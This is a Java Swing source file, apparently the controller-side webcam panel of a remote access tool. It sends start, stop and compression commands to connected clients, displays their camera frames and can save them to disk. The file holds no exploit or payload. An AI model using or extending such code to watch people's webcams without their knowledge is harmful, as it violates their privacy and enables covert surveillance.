package me.sebsb.gui;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.border.LineBorder;

import me.sebsb.ConnectedClient;
import me.sebsb.action.Action;
import me.sebsb.utils.NetUtils;
import javax.swing.JSlider;

public class GuiWebcam extends JFrame {

	private JPanel contentPane;
	private JPanel video;
	
	private JLabel label;
	private JCheckBox checkbox;
	private JButton btnStart;
	private JButton btnStart_1;

	private ConnectedClient client;
	public GuiWebcam(ConnectedClient client) {
		this.client = client;
		setTitle(client.getUsername());
		setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
		setBounds(100, 100, 400, 400);
		contentPane = new JPanel();
		contentPane.setBorder(new LineBorder(new Color(0, 0, 0), 1, true));
		setContentPane(contentPane);
		contentPane.setLayout(null);
		
		video = new JPanel();
		video.setBounds(1, 24, 399, 353);
		video.setBorder(new LineBorder(new Color(0, 0, 0), 1, true));
		video.setLayout(new BorderLayout(0, 0));
		contentPane.add(video);
		
		checkbox = new JCheckBox("Save Frames");
		checkbox.setBounds(1, 1, 109, 23);
		contentPane.add(checkbox);
		
		btnStart_1 = new JButton("Start");
		btnStart_1.setBounds(108, 1, 75, 27);
		btnStart_1.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				Action a = Action.WEBCAM;
				ArrayList<String> data = new ArrayList<String>();
				data.add("start");
				a.setData(data);
				NetUtils.sendMessage(a.getCommand(), client.getPrintWriter());
			}
			
		});
		contentPane.add(btnStart_1);
		
		btnStart = new JButton("Stop");
		btnStart.setBounds(176, 1, 58, 27);
		btnStart.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				setImage(null);
				Action a = Action.WEBCAM;
				ArrayList<String> data = new ArrayList<String>();
				data.add("stop");
				a.setData(data);
				NetUtils.sendMessage(a.getCommand(), client.getPrintWriter());
			}
			
		});
		contentPane.add(btnStart);
		
		label = new JLabel();
		video.add(label, BorderLayout.SOUTH);
		
		compSlider = new JSlider();
		compSlider.setBackground(Color.BLACK);
		compSlider.setBounds(246, 1, 127, 23);
		contentPane.add(compSlider);
	}
	private JSlider compSlider;

	private int lastSet;
	
	public void setNoWebcam() {
		new Thread(new Runnable() {

			@Override
			public void run() {
				JOptionPane.showMessageDialog(null, client.getUsername() + " does not have a webcam.", "Webcam", JOptionPane.ERROR_MESSAGE);
			}
			
		}).start();
	}
	
	public void setImage(BufferedImage image) {
		if (image == null) {
			this.label.setIcon(null);
			return;
		}
		if (this.isVisible()) {
			if (lastSet != compSlider.getValue()) {
				lastSet = compSlider.getValue();
				Action a = Action.WEBCAM;
				a.setData(new String[] {"comp", ((float)compSlider.getValue() / (float)compSlider.getMaximum()) + ""});
				NetUtils.sendMessage(a.getCommand(), client.getPrintWriter());
			}
			video.setSize(contentPane.getWidth(), contentPane.getHeight() - 25);
			this.label.setIcon(new ImageIcon(image.getScaledInstance(video.getWidth(), video.getHeight(), 0)));
		}
		
		if (checkbox.isSelected()) {
			File folder = new File("Frames");
			if (!folder.exists()) {
				folder.mkdir();
			}
			try {
				ImageIO.write(image, "png", new FileOutputStream(new File(folder, System.currentTimeMillis() + ".png")));
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
}
